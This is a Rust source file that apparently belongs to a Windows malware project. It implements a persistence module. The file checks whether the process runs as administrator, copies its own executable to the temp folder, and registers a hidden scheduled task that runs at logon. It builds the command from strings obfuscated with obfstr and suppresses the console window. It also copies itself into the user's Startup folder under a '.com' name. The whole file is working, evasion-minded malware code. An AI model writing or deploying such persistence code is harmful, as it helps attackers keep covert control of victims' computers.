use std::ffi::CString;
use winapi::shared::minwindef::HKEY;
use winapi::um::winnt::REG_SZ;
use winapi::um::winreg::HKEY_CURRENT_USER;
use winapi::um::winreg::RegSetValueExA;
use winapi::um::winnt::{KEY_SET_VALUE, REG_OPTION_NON_VOLATILE};
use winapi::um::winreg::RegCreateKeyExA;
use std::os::windows::process::CommandExt;

use winapi::um::{
    securitybaseapi::{AllocateAndInitializeSid, CheckTokenMembership, FreeSid},
    winnt::{
        DOMAIN_ALIAS_RID_ADMINS, SECURITY_BUILTIN_DOMAIN_RID, SECURITY_NT_AUTHORITY,
        SID_IDENTIFIER_AUTHORITY
    },
};



pub unsafe fn is_elevated() -> bool {
    let mut is_admin;
    let mut admins_group = std::mem::MaybeUninit::uninit();
    let mut nt_authority = SID_IDENTIFIER_AUTHORITY {
        Value: SECURITY_NT_AUTHORITY,
    };

    is_admin = AllocateAndInitializeSid(
        &mut nt_authority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0,
        0,
        0,
        0,
        0,
        0,
        admins_group.as_mut_ptr(),
    );

    if is_admin != 0 {

        let admins_group = admins_group.assume_init();
        if CheckTokenMembership(std::ptr::null_mut(), admins_group, &mut is_admin) == 0 {
            is_admin = 0;
        }
        FreeSid(admins_group);
    }

    is_admin != 0
}


pub fn enable_persistance(name: &str) {
    unsafe {
        if is_elevated() {
           let _ = add_schtasks(name);            
           let _ = toggle_autostart(name);

        } else {
            let _ = toggle_autostart(name);
        }
    }
}

fn add_schtasks(name: &str) -> Result<(), std::io::Error> {
    let current_path = std::env::current_exe()?;
    let tmp = std::env::temp_dir();
    let full_path = format!("{}\\{name}", tmp.to_string_lossy());
    std::fs::copy(current_path, &full_path)?;


    let _ = std::process::Command::new(obfstr::obfstr!("cmd.exe")).creation_flags(0x08000000) // Detached Process, Dont show cmd
        .arg("/c")
        .arg(format!(
            "{} {full_path} {} {name} /IT",
            obfstr::obfstr!("schtasks /Create /TR"),
            obfstr::obfstr!("/SC ONLOGON /TN")
        ))
        .spawn()
        .expect("Error"); // fuck this garbage code uwu
        
        Ok(())
}



pub unsafe fn toggle_autostart(name: &str) -> Result<(), std::io::Error> {
 

  
    let current_path = std::env::current_exe()?;



   


    let username = std::env::var("USERNAME").unwrap();

    let path = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", username);


    println!("Path: {}", current_path.display().to_string().replace(r"\\?\", ""));

        std::thread::sleep(std::time::Duration::from_secs(15));
        std::fs::copy(current_path.display().to_string().replace(r"\\?\", ""), format!("{path}\\{name}.com"))?;

    Ok(())
}